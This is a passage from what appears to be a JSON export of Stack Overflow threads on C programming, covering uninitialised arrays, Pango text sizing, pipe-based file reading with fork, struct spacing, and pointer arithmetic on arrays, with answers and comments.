"https://www.gravatar.com/avatar/355d66d4a2ef6c0109bdb0359f7c01de?s=128&d=identicon&r=PG&f=1", "display_name": "ehem", "link": "https://stackoverflow.com/users/5437053/ehem"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 157, "favorite_count": 0, "accepted_answer_id": 33658292, "answer_count": 2, "score": 0, "last_activity_date": 1521842956, "creation_date": 1447269612, "last_edit_date": 1521842956, "question_id": 33658228, "link": "https://stackoverflow.com/questions/33658228/c-print-array", "title": "C - Print Array", "body": "<p>I am trying to print the elements that I add in an array in real time \n. </p>\n\n<p><em>Everything seems to work fine but</em></p>\n\n<p><strong>for example</strong> </p>\n\n<blockquote>\n  <p>I add the numbers 1 2 3</p>\n</blockquote>\n\n<p><strong>But the resuls are :</strong>  <code>9966656 2686588 1 2 3</code></p>\n\n<p>I don't know why It prints <em>9966656 2686588</em> as well and not only <em>1 2 3</em></p>\n\n<pre><code>    int numbers[100] , c , x;\n    char answer;\n    puts(\"Please insert a value\");\n\nGO:\n    scanf(\"%d\", &amp;numbers[c]);\n    getchar();\n    puts(\"Do you want to add another value? y/n\");\n    scanf(\"%c\",&amp;answer);\n    if (answer == 'y') {\n        c = c + 1;\n        puts(\"Please insert another value\");\n        goto GO;\n    } else {\n        x = c;\n\n        for (c = 0; c &lt; x + 1; c++) {\n            printf(\"%d \",numbers[c]);\n        }\n    }\n</code></pre>\n\n<p>*=====================</p>\n\n<p>Let me know if you haven't understand something*</p>\n"}, {"tags": ["c", "ubuntu", "gtk", "pango"], "answers": [{"comments": [{"owner": {"reputation": 229, "user_id": 2062604, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/52fdef07948ee8c648517fa76935500f?s=128&d=identicon&r=PG", "display_name": "user2062604", "link": "https://stackoverflow.com/users/2062604/user2062604"}, "edited": false, "score": 0, "creation_date": 1447340567, "post_id": 33659530, "comment_id": 55121893, "body": "Perfect, that&#39;s exactly what I needed. Thank you!"}], "tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": true, "score": 3, "last_activity_date": 1447341385, "last_edit_date": 1447341385, "creation_date": 1447274804, "answer_id": 33659530, "question_id": 33658148, "link": "https://stackoverflow.com/questions/33658148/why-is-pango-layout-get-pixel-size-slightly-wrong-on-ubuntu-linux-in-c/33659530#33659530", "title": "Why is pango_layout_get_pixel_size slightly wrong on Ubuntu Linux in C", "body": "<p>The text you are displaying (<code>\"NO DATA AVAILABLE\"</code>) is all-caps, and consequently has no descenders (letters which are partly below the baseline, like j, p and q.) Normally, when you measure the extent of a text box, you include room for the descenders whether or not they are present; otherwise, you will see odd artifacts such as inconsistent line separation depending on whether or not a given line has a descender.</p>\n\n<p>Pango provides APIs which return both the <em>logical</em> extent (which includes the full height of the font) and the <em>ink</em> extent (which is the bounding box of the inked part of the image). I suspect you are looking for the ink extent.</p>\n"}], "owner": {"reputation": 229, "user_id": 2062604, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/52fdef07948ee8c648517fa76935500f?s=128&d=identicon&r=PG", "display_name": "user2062604", "link": "https://stackoverflow.com/users/2062604/user2062604"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 733, "favorite_count": 1, "accepted_answer_id": 33659530, "answer_count": 1, "score": 2, "last_activity_date": 1447341385, "creation_date": 1447269300, "question_id": 33658148, "link": "https://stackoverflow.com/questions/33658148/why-is-pango-layout-get-pixel-size-slightly-wrong-on-ubuntu-linux-in-c", "title": "Why is pango_layout_get_pixel_size slightly wrong on Ubuntu Linux in C", "body": "<p>I'm experiencing a frustrating issue trying to draw text using Pango and Cairo libraries in C in a Gtk application running on Ubuntu Linux.</p>\n\n<p>I'm creating a Pango layout and then drawing it at a given location which is determined by the size of the text as reported by pango_layout_get_pixel_size, but the size returned by that function is wrong in both width and height, especially in height. Here is my full code:</p>\n\n<pre><code>// Create a cairo context with which to draw\n// Note that we already have a GtkDrawingArea widget m_pGtkDrawingArea\ncairo_t *cr = gdk_cairo_create(m_pGtkDrawingArea-&gt;window);\n\n// Text to draw\nstd::string szText(\"NO DATA AVAILABLE\");\n\n// Create the layout\nPangoLayout *pLayout = gtk_widget_create_pango_layout(m_pGtkDrawingArea, szText.c_str());\n\n// Set layout properties\npango_layout_set_alignment(pLayout, PANGO_ALIGN_LEFT);\npango_layout_set_width(pLayout, -1);\n\n// The family to use\nstd::string szFontFamily(\"FreeSans\");\n\n// The font size to use\ndouble dFontSize = 36.0;\n\n// Format the font description string\nchar szFontDescription[32];\nmemset(&amp;(szFontDescription[0]), 0, sizeof(szFontDescription));\nsnprintf(szFontDescription, sizeof(szFontDescription) - 1, \"%s %.1f\", szFontFamily.c_str(), dFontSize);\n\n// Get a new pango font description\nPangoFontDescription *pFontDescription = pango_font_description_from_string(szFontDescription);\n\n// Set up the pango font description\npango_font_description_set_weight(pFontDescription, PANGO_WEIGHT_NORMAL);\npango_font_description_set_style(pFontDescription, PANGO_STYLE_NORMAL);\npango_font_description_set_variant(pFontDescription, PANGO_VARIANT_NORMAL);\npango_font_description_set_stretch(pFontDescription, PANGO_STRETCH_NORMAL);\n\n// Set this as the pango font description on the layout\npango_layout_set_font_description(pLayout, pFontDescription);\n\n// Use auto direction\npango_layout_set_auto_dir(pLayout, TRUE);\n\n// Get the pixel size of this text - this reports a size of 481x54 pixels\nint iPixelWidth = 0, iPixelHeight = 0;\npango_layout_get_pixel_size(pLayout, &amp;iPixelWidth, &amp;iPixelHeight);\n\n// Calculate the text location based on iPixelWidth and iPixelHeight\ndouble dTextLocX = ...;\ndouble dTextLocY = ...;\n\n// Set up the cairo context for drawing the text\ncairo_set_source_rgba(cr, 1.0, 1.0, 1.0, 1.0);\ncairo_set_antialias(cr, CAIRO_ANTIALIAS_BEST);\n\n// Move into place\ncairo_move_to(cr, dTextLocX, dTextLocY);\n\n// Draw the layout\npango_cairo_show_layout(cr, pLayout);\n\n//\n// pango_layout_get_pixel_size() reported a size of 481x54 pixels,\n// but the actual size when drawn is 478x37 pixels!\n//\n\n//\n// Clean up...\n//\n</code></pre>\n\n<p>So, as described at the bottom of the above code, the pango_layout_get_pixel_size function reports a size of 481x54 pixels, but the size of the text on the screen is actually 478x37 pixels.</p>\n\n<p>What am I doing wrong here? How can I get the actual correct pixel size?</p>\n\n<p>Thanks in advance for your help!</p>\n"}, {"tags": ["c", "file", "pipe"], "comments": [{"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 1, "creation_date": 1447269031, "post_id": 33657837, "comment_id": 55089502, "body": "<code>read(p[j][0], &amp;fd,sizeof(buf))</code>? <code>fd</code> is a <code>FILE*</code>, you probably mean <code>buf</code>? And after that you can&#39;t print a &quot;buffer&quot; as &quot;%c&quot;."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447269716, "post_id": 33657837, "comment_id": 55089911, "body": "Note: always compile with all warnings and you will see several problems (not all, but several). At least you would have seen that <code>read</code> is called with <code>&amp;fd</code> that is wrong."}], "answers": [{"tags": [], "owner": {"reputation": 57, "user_id": 4244472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0478dd0fe807364e872e7863bca86da?s=128&d=identicon&r=PG&f=1", "display_name": "swiley", "link": "https://stackoverflow.com/users/4244472/swiley"}, "is_accepted": false, "score": 0, "last_activity_date": 1447269103, "creation_date": 1447269103, "answer_id": 33658084, "question_id": 33657837, "link": "https://stackoverflow.com/questions/33657837/q-reading-from-pipe-to-screen/33658084#33658084", "title": "Q: Reading from pipe to screen", "body": "<p>You're not reading anything in to buf as far as I can tell.</p>\n"}, {"tags": [], "owner": {"reputation": 61555, "user_id": 648658, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/75ee864ee3bef78f2a144398789fed25?s=128&d=identicon&r=PG", "display_name": "Jens", "link": "https://stackoverflow.com/users/648658/jens"}, "is_accepted": false, "score": 3, "last_activity_date": 1447270089, "last_edit_date": 1447270089, "creation_date": 1447269396, "answer_id": 33658163, "question_id": 33657837, "link": "https://stackoverflow.com/questions/33657837/q-reading-from-pipe-to-screen/33658163#33658163", "title": "Q: Reading from pipe to screen", "body": "<p>You are confusing C Standard I/O streams (created with <code>fopen()</code>; written to with <code>fprintf()</code> et al., read with <code>fscanf()</code> et al.) with Unix file descriptor I/O (created with <code>open()</code> or <code>pipe()</code> et al., written to with <code>write()</code> et al., read with <code>read()</code> et al.)</p>\n\n<p>Standard I/O functions take an opaque <code>FILE *</code> as a handle; Unix I/O functions take a file descriptor (a small int) as a handle.</p>\n\n<p>Once you understand the conceptual difference, I'm sure you will realize that</p>\n\n<pre><code>FILE *fd = ...\nread(..., &amp;fd, ...);\n</code></pre>\n\n<p>is reading into a pointer-to-FILE -- not terribly useful :-)</p>\n"}, {"comments": [{"owner": {"reputation": 15, "user_id": 5551844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d5e776f8884467311a8baf40d1efc29?s=128&d=identicon&r=PG&f=1", "display_name": "ayzkub", "link": "https://stackoverflow.com/users/5551844/ayzkub"}, "edited": false, "score": 0, "creation_date": 1447271779, "post_id": 33658421, "comment_id": 55091051, "body": "Regarding the 3 problem: Isn&#39;t the write() writing the content of the opened file to the pipe?                                                                              About the 4 problem I understand what the problem is but I&#39;m not sure how to translate it."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "reply_to_user": {"reputation": 15, "user_id": 5551844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d5e776f8884467311a8baf40d1efc29?s=128&d=identicon&r=PG&f=1", "display_name": "ayzkub", "link": "https://stackoverflow.com/users/5551844/ayzkub"}, "edited": false, "score": 0, "creation_date": 1447272795, "post_id": 33658421, "comment_id": 55091596, "body": "No (for 3). No function exists to read+write in the same call. You have to 1. get data inside a buffer (that can be read from a file, read from stdin, generated...), and 2. then write this data."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "reply_to_user": {"reputation": 15, "user_id": 5551844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d5e776f8884467311a8baf40d1efc29?s=128&d=identicon&r=PG&f=1", "display_name": "ayzkub", "link": "https://stackoverflow.com/users/5551844/ayzkub"}, "edited": false, "score": 0, "creation_date": 1447272884, "post_id": 33658421, "comment_id": 55091636, "body": "For the 4. the read function returns the amount of data really read (it could be less than your buffer size). So after that the print (which is a write on stdout) must use this size."}, {"owner": {"reputation": 15, "user_id": 5551844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d5e776f8884467311a8baf40d1efc29?s=128&d=identicon&r=PG&f=1", "display_name": "ayzkub", "link": "https://stackoverflow.com/users/5551844/ayzkub"}, "edited": false, "score": 0, "creation_date": 1447277790, "post_id": 33658421, "comment_id": 55094149, "body": "Thanks a lot for the answer, I&#39;ve been struggling to understand how to make it work properly."}], "tags": [], "owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "is_accepted": true, "score": 1, "last_activity_date": 1447276292, "last_edit_date": 1447276292, "creation_date": 1447270367, "answer_id": 33658421, "question_id": 33657837, "link": "https://stackoverflow.com/questions/33657837/q-reading-from-pipe-to-screen/33658421#33658421", "title": "Q: Reading from pipe to screen", "body": "<p>Several problems here:</p>\n\n<ol>\n<li>you make bad usage of <code>read</code> function by passing <code>&amp;fd</code>, which is a <code>FILE*</code>. This function needs a pointer to the \"buffer\" to print, here I guess <code>buf</code>.</li>\n<li>you don't check errors. For example if <code>fopen</code> fails.</li>\n<li>you never read data from your file, so you have \"nothing\" to send to children.</li>\n<li>you have to get returned value of <code>read</code> (in children) because it is the effective amount of data that you get. So it is the amount of data that you have to print after that (to stdout).</li>\n</ol>\n\n<p>So here is an example code, see comments inside:</p>\n\n<pre><code>// put here all the needed includes (see manpages of functions)\n\n// it is better to create a function for the child: the code\n// is easier to read\n// the child just get the file descriptor to read (the pipe)\nvoid child(int fd) {\n  char buf[100];  // buffer to store data read\n  int ret;        // the number of bytes that are read\n\n  // we read from 'fd', into 'buf'. It returns the number of bytes\n  // really read (could be smaller than size). Return &lt;=0 when over\n  while((ret = read(fd, buf, sizeof(buf))) &gt; 0) {\n    // write the 'ret' bytes to STDOUT (which as file descriptor 1)\n    write(1, buf, ret);\n  }\n}\n\nint main (void) {\n  pid_t pid;\n  char buf[100];\n  int N_CHILDREN = 2;\n  int p[N_CHILDREN][2];\n  int i,j, ret;\n  int fdi;\n  // create the pipes\n  for(i=0; i&lt;N_CHILDREN; i++) {\n    if (pipe(p[i]) == -1) {\n      perror(\"pipe\");  // ALWAYS check for errors\n      exit(1);\n    }\n  }\n  // open the file (with 'open' not 'fopen', more suitable for\n  // reading raw data\n  fdi = open(\"123.txt\",O_RDONLY);\n  if (fdi &lt; 0) {\n    perror(\"open\"); // ALWAYS check for errors\n    exit(1);\n  }\n  // just spawn the children\n  for(j=0; j &lt; N_CHILDREN;j++) { \n    pid = fork();\n    if (pid &lt; 0) {\n      perror(\"fork\"); // ALWAYS check for errors\n      exit(1);\n    }\n    if (pid == 0) {  // child\n      close(p[j][1]);  // close the writing part\n      child(p[j][0]);  // call child function with corresp. FD\n      exit(0);  // leave : the child should do nothing else\n    }\n  }\n  // don't need that part\n  for(j=0; j&lt;N_CHILDREN; j++) {\n    close(p[j][0]);  // close the read-part of pipes\n  }\n  // need to read file content, see comment in child() function\n  while ((ret = read(fdi, buf, sizeof(buf))) &gt; 0) {\n    // write the data to all children\n    for(j=0; j&lt;N_CHILDREN; j++) {\n      write(p[j][1], buf , ret); // we write the size we get\n    }\n  }\n  // close everithing\n  for(j=0; j&lt;N_CHILDREN; j++) {\n    close(p[j][1]);  // needed, see text after\n  }\n  close(fdi); // close read file\n  return(0); // main returns a int, 0 is \"ok\"\n}\n</code></pre>\n\n<p>You have to close every parts of pipes when not needed or when it is over. Until a file descriptor is open a read will block the process. Only when last write counterpart is closed the read returns &lt;=0.</p>\n\n<p>Note: 1. the correct usage of read/write function 2. checking for errors 3. reading from the file and writing to the pipe(s) 4. dealing with effective amount of data read (<code>ret</code> variable) so that you can write (to \"screen\" or to an other file descriptor the right amount of data.</p>\n"}], "owner": {"reputation": 15, "user_id": 5551844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d5e776f8884467311a8baf40d1efc29?s=128&d=identicon&r=PG&f=1", "display_name": "ayzkub", "link": "https://stackoverflow.com/users/5551844/ayzkub"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "accepted_answer_id": 33658421, "answer_count": 3, "score": 1, "last_activity_date": 1447276292, "creation_date": 1447268237, "question_id": 33657837, "link": "https://stackoverflow.com/questions/33657837/q-reading-from-pipe-to-screen", "title": "Q: Reading from pipe to screen", "body": "<p>I'm trying to write a program that reads some text from a file and prints it to the screen. The parent will read the content of the file write it to n number of pipes and the children will read it and then print it. </p>\n\n<p>So far this is what I've got:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;string.h&gt;\n\nint main (void)\n{\n  pid_t pid;\n  char c;\n  FILE *fd;\n  char buf[100];\n  int N_CHILDREN = 2;\n  int p[N_CHILDREN][2];\n  int i,j;\n\n  for(i=0; i&lt;N_CHILDREN; i++)\n  {\n    pipe(p[i]);\n  }\n\n  fd=fopen(\"123.txt\",\"r\");\n\n  for(j=0; j &lt; N_CHILDREN;j++)\n  { \n    pid = fork ();\n\n    if (pid == 0)\n     {     \n           close (p[j][1]);\n           while(read(p[j][0], &amp;fd,sizeof(buf)) &gt; 0)\n            printf(\"\\n%c\",&amp;fd);\n\n      }\n    if (pid &lt; 0) \n     {\n       //Fork Failed\n           fprintf (stderr, \"Fork failure.\\n\");\n           return EXIT_FAILURE;\n         }\n    if ( pid &gt; 0) //Parent\n     {  \n             close (p[j][0]);\n             write(p[j][1], fd ,sizeof(buf));\n\n     }\n  }\n}\n</code></pre>\n\n<p>Problem is it's not really reading the content from the file. I've tried sending it a string of characters instead of reading from a file and it worked as intended, both children printed the message one time and the program ended.</p>\n\n<p>Any thoughts about it? After reading the manuals I still can't see where the problem is.</p>\n"}, {"tags": ["c", "struct", "structure"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1447269338, "post_id": 33657827, "comment_id": 55089684, "body": "Because the size of the padded struct is 16 bytes (each single byte is padded with additional 7)."}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1447282689, "post_id": 33657827, "comment_id": 55096506, "body": "@EugeneSh. The struct shown here is in all likelyhood not padded in any shape of form, and its size is 2, at least on all common platforms."}], "answers": [{"tags": [], "owner": {"reputation": 619, "user_id": 5415255, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f19dc68c0e1eec9ddd30b43152c74908?s=128&d=identicon&r=PG&f=1", "display_name": "ARK", "link": "https://stackoverflow.com/users/5415255/ark"}, "is_accepted": false, "score": 0, "last_activity_date": 1447270424, "creation_date": 1447270424, "answer_id": 33658441, "question_id": 33657827, "link": "https://stackoverflow.com/questions/33657827/why-difference-between-structure-variable-is-always-giving-16bytes-in-64-bit-os/33658441#33658441", "title": "Why difference between structure variable is always giving 16bytes in 64 bit OS?", "body": "<p>Generally compiler may pad bytes, to keep each structure variable start position to word or double-word alignment. I guess the choice of alignment position may be architecture and compiler dependent. </p>\n\n<p>It seems your compiler is keeping 16-byte alignment for each structure variable. Sometimes compiler may pad bytes to elements of structure to keep word or double-word alignment. You can check where the bytes padding happening, I mean bytes or padded at element level or structure level.</p>\n\n<p>Do print each element address (as below) and see the difference between them. </p>\n\n<pre><code>printf(\"Size:%u %u Address_Diff:%d \\n\",&amp;p.c, &amp;p.e);\n</code></pre>\n\n<p>If difference is just one byte, it means that bytes are padded at structure level i.e., at the end of structure.</p>\n"}], "owner": {"reputation": 11, "user_id": 5363591, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adb0a92c362198e5bc40538ab82d83d9?s=128&d=identicon&r=PG&f=1", "display_name": "Venkatesh Akula", "link": "https://stackoverflow.com/users/5363591/venkatesh-akula"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447270424, "creation_date": 1447268185, "last_edit_date": 1447268568, "question_id": 33657827, "link": "https://stackoverflow.com/questions/33657827/why-difference-between-structure-variable-is-always-giving-16bytes-in-64-bit-os", "title": "Why difference between structure variable is always giving 16bytes in 64 bit OS?", "body": "<pre><code>#include&lt;stdio.h&gt;\n\nstruct std\n  {\n  char c;\n  char e;\n};\n\nvoid main()\n  {\n  struct std p,q;\n  int start,last;\n  last= &amp;q;\n  start= &amp;p;\n  printf(\"Size:%u %u Address_Diff:%d \\n\",&amp;p, &amp;q,(last-start) );\n}\n</code></pre>\n\n<p>I am learning structure alignment and padding while we executing above program every time difference between two structure variables showing 16 bytes. I am not understanding why the difference is 16 bytes but i'm expecting the difference is 2 bytes.</p>\n\n<p>some examples: </p>\n\n<p>4077309424 4077309440 diff:16</p>\n\n<p>3600238672 3600238688 diff:16</p>\n\n<p>3272011008 3272011024 diff:16       </p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1447268025, "post_id": 33657766, "comment_id": 55088956, "body": "Read section 6 of the <a href=\"http://www.c-faq.com/\" rel=\"nofollow noreferrer\">comp.lang.c FAQ</a>."}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 1, "creation_date": 1447268353, "post_id": 33657766, "comment_id": 55089149, "body": "<code>a</code> and <code>&amp;a</code> give the same address, but different types.  So <code>a + 1</code> moves by the size of an <code>int</code>, but <code>&amp;a + 1</code> moves by the size of a 5 element <i>array</i> of <code>int</code>."}], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 5000444, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/876aa9b89c16968a5d78c21d0b8b9c9e?s=128&d=identicon&r=PG&f=1", "display_name": "Atom", "link": "https://stackoverflow.com/users/5000444/atom"}, "edited": false, "score": 0, "creation_date": 1447269040, "post_id": 33657833, "comment_id": 55089511, "body": "base address of array?"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 25, "user_id": 5000444, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/876aa9b89c16968a5d78c21d0b8b9c9e?s=128&d=identicon&r=PG&f=1", "display_name": "Atom", "link": "https://stackoverflow.com/users/5000444/atom"}, "edited": false, "score": 0, "creation_date": 1447269112, "post_id": 33657833, "comment_id": 55089551, "body": "@Atom Address of first element of array <code>&amp;a[0]</code>."}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": true, "score": 4, "last_activity_date": 1447268582, "last_edit_date": 1447268582, "creation_date": 1447268219, "answer_id": 33657833, "question_id": 33657766, "link": "https://stackoverflow.com/questions/33657766/c-programming-pointers-and-arrays/33657833#33657833", "title": "C programming Pointers and Arrays?", "body": "<pre><code>printf(\"%p\\n%p\\n\",&amp;a+1,&amp;a[1]);\n</code></pre>\n\n<p>In this line both address are different because <code>&amp;a[1]</code> gives address of <code>a[1]</code> and <code>&amp;a+1</code> gives address that is one past the last element of array . </p>\n\n<p><code>&amp;a</code> give address of array and adding <code>1</code> to it adds <em>size of array</em> to base address of array <code>a</code>. </p>\n\n<p>So basically , <code>&amp;a+1</code> = Base address of array <code>a</code> + size of array <code>a</code> (that address is printed)</p>\n"}, {"tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": 0, "last_activity_date": 1447270560, "last_edit_date": 1495542281, "creation_date": 1447268279, "answer_id": 33657845, "question_id": 33657766, "link": "https://stackoverflow.com/questions/33657766/c-programming-pointers-and-arrays/33657845#33657845", "title": "C programming Pointers and Arrays?", "body": "<p><code>&amp;a[1]</code> is equivalent to <code>&amp;*(a + 1) = (a + 1)</code> and that's why first snippet prints the same address value.   </p>\n\n<p><code>&amp;a</code> is the address of array <code>a</code>. It is of type <code>int (*)[5]</code>. Adding <code>1</code> to <code>&amp;a</code> will enhance it to one past the array, i.e. it will add <code>sizeof(a)</code> bytes to <code>&amp;a</code>.   </p>\n\n<p>Suggested reading: <a href=\"https://stackoverflow.com/q/24467726/2455888\">What exactly is the array name in c?</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 2, "creation_date": 1447268701, "post_id": 33657856, "comment_id": 55089344, "body": "&quot;Remember, in C, an array variable is a pointer&quot; \u2013 he better not remember such bulls**t. &quot;&amp;a is not the address of the array&quot; \u2013 it absolutely is."}], "tags": [], "owner": {"reputation": 2384, "user_id": 4624683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39130cd702675dc4f741e62e64479eb6?s=128&d=identicon&r=PG&f=1", "display_name": "DBug", "link": "https://stackoverflow.com/users/4624683/dbug"}, "is_accepted": false, "score": -1, "last_activity_date": 1447268325, "creation_date": 1447268325, "answer_id": 33657856, "question_id": 33657766, "link": "https://stackoverflow.com/questions/33657766/c-programming-pointers-and-arrays/33657856#33657856", "title": "C programming Pointers and Arrays?", "body": "<p>The '&amp;' means \"address of\", and the %p format means print the value as a pointer (address), which prints it in hex.  When doing \"pointer arithmetic\", when you add 1 to a pointer, the pointer is incremented (1 * sizeof(type)) where \"type\" is the type of data being pointed to.</p>\n\n<p>Remember, in C, an array variable is a pointer.  &amp;a is not the address of the array, but the address where the address of the array is stored.  So, when you add 1 to &amp;a, &amp;a contains a, which is a pointer, so (&amp;a + 1) is (&amp;a + size(a)), and since a is an array, it's the size of the array.  In this case, an array of 4 ints is 16 bytes.</p>\n"}, {"comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 2, "creation_date": 1447268852, "post_id": 33657947, "comment_id": 55089415, "body": "The values he gets are fine, and wrong speciffiers should not be used ."}], "tags": [], "owner": {"reputation": 11, "user_id": 5550822, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jkY2y.png?s=128&g=1", "display_name": "mmusic", "link": "https://stackoverflow.com/users/5550822/mmusic"}, "is_accepted": false, "score": 0, "last_activity_date": 1447268640, "creation_date": 1447268640, "answer_id": 33657947, "question_id": 33657766, "link": "https://stackoverflow.com/questions/33657766/c-programming-pointers-and-arrays/33657947#33657947", "title": "C programming Pointers and Arrays?", "body": "<p>Sign \"&amp;\" is address of element after &amp; sign so in printf,it will print out memory address of your element.</p>\n\n<blockquote>\n  <p>and does it have to do with the format specifier %p? </p>\n</blockquote>\n\n<p>%p is accessing to pointer(address that pointer is reffering to) and that's why you get values like 'x0000'...</p>\n\n<p>Try using %d or %i for integer values in your tasks.</p>\n"}], "owner": {"reputation": 25, "user_id": 5000444, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/876aa9b89c16968a5d78c21d0b8b9c9e?s=128&d=identicon&r=PG&f=1", "display_name": "Atom", "link": "https://stackoverflow.com/users/5000444/atom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "accepted_answer_id": 33657833, "answer_count": 4, "score": 1, "last_activity_date": 1447270560, "creation_date": 1447267875, "last_edit_date": 1447268769, "question_id": 33657766, "link": "https://stackoverflow.com/questions/33657766/c-programming-pointers-and-arrays", "title": "C programming Pointers and Arrays?", "body": "<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    int a[5];\n    printf(\"%p\\n%p\\n\",a+1,&amp;a[1]);\n    return(0);\n}\n</code></pre>\n\n<p>When the above code is built and run.\nThe output is:</p>\n\n<pre><code>0029ff00\n0029ff00\n</code></pre>\n\n<p>Then when i change the 5th line from <code>a + 1</code> to <code>&amp;a + 1</code></p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n   int a[5];\n   printf(\"%p\\n%p\\n\",&amp;a+1,&amp;a[1]);\n   return(0);\n}\n</code></pre>\n\n<p>The output 